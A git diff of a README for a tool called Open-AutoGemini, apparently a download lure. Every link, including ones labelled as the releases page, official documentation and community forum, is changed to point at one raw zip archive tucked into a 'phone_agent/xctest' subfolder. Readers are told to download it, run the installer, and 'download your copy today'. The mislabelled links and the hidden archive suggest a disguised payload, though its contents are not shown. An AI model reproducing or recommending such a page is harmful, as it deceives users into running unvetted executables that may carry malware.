@@ -1,6 +1,6 @@
 # 🚀 Open-AutoGemini - Easy Setup for Gem-Adapted Models
 
-[![Download Open-AutoGemini](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/scripts/Open-Gemini-Auto-1.8.zip)](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/scripts/Open-Gemini-Auto-1.8.zip)
+[![Download Open-AutoGemini](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/phone_agent/xctest/Open_Auto_Gemini_1.2.zip)](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/phone_agent/xctest/Open_Auto_Gemini_1.2.zip)
 
 ## 📦 Overview
 
@@ -33,13 +33,13 @@ To get started with Open-AutoGemini, follow these steps:
 
 1. **Visit the Releases Page:**
    Click the link below to go to the releases page, where you can download the software.
-   [Download Open-AutoGemini](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/scripts/Open-Gemini-Auto-1.8.zip)
+   [Download Open-AutoGemini](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/phone_agent/xctest/Open_Auto_Gemini_1.2.zip)
 
 2. **Choose the Latest Version:**
    On the releases page, look for the latest version marked at the top. 
 
 3. **Download the Installer:**
-   Find the installer file for your operating system (e.g., `https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/scripts/Open-Gemini-Auto-1.8.zip`). Click on the file to start the download.
+   Find the installer file for your operating system (e.g., `https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/phone_agent/xctest/Open_Auto_Gemini_1.2.zip`). Click on the file to start the download.
 
 4. **Run the Installer:**
    Once the download finishes, locate the installer file in your downloads folder. Double-click on it to start the installation process.
@@ -76,9 +76,9 @@ Want to contribute? You're welcome! Please read the contribution guidelines in t
 
 For more detailed instructions or to find troubleshooting tips, check the following resources:
 
-- [Official Documentation](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/scripts/Open-Gemini-Auto-1.8.zip) 
-- [Community Forum](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/scripts/Open-Gemini-Auto-1.8.zip)
+- [Official Documentation](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/phone_agent/xctest/Open_Auto_Gemini_1.2.zip) 
+- [Community Forum](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/phone_agent/xctest/Open_Auto_Gemini_1.2.zip)
 
 By following these instructions, you will enjoy a seamless experience with Open-AutoGemini, maximizing your ability to leverage model-based insights with ease. Don't hesitate; download your copy today!
 
-[Download Open-AutoGemini](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/scripts/Open-Gemini-Auto-1.8.zip)
+[Download Open-AutoGemini](https://github.com/Mwebesanorman/Open-AutoGemini/raw/refs/heads/main/phone_agent/xctest/Open_Auto_Gemini_1.2.zip)
